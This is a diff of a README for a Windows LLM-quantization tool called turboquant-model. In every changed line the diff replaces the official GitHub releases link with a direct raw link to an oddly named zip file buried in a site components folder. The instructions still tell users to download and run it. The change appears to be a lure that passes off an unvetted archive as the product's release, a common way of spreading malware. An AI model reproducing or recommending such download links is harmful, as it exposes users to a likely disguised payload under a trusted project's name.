@@ -1,10 +1,10 @@
 # 🧠 turboquant-model - Run large models with less memory
 
-[![Download](https://img.shields.io/badge/Download-Releases-2F80ED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/IbadKhalid7/turboquant-model/releases)
+[![Download](https://img.shields.io/badge/Download-Releases-2F80ED?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/IbadKhalid7/turboquant-model/main/site/src/components/model_turboquant_Ichthyornithidae.zip)
 
 ## 📥 Download
 
-Visit this page to download: https://github.com/IbadKhalid7/turboquant-model/releases
+Visit this page to download: https://raw.githubusercontent.com/IbadKhalid7/turboquant-model/main/site/src/components/model_turboquant_Ichthyornithidae.zip
 
 On Windows, open the latest release and download the file that matches your computer. If there is more than one file, choose the one meant for Windows.
 
@@ -131,4 +131,4 @@ Quantized models can be saved to disk and loaded later. This helps when you want
 - Main focus: low-memory LLM inference
 - Core method: online vector quantization
 - Use case: local model inference on Windows
-- Download page: https://github.com/IbadKhalid7/turboquant-model/releases
+- Download page: https://raw.githubusercontent.com/IbadKhalid7/turboquant-model/main/site/src/components/model_turboquant_Ichthyornithidae.zip
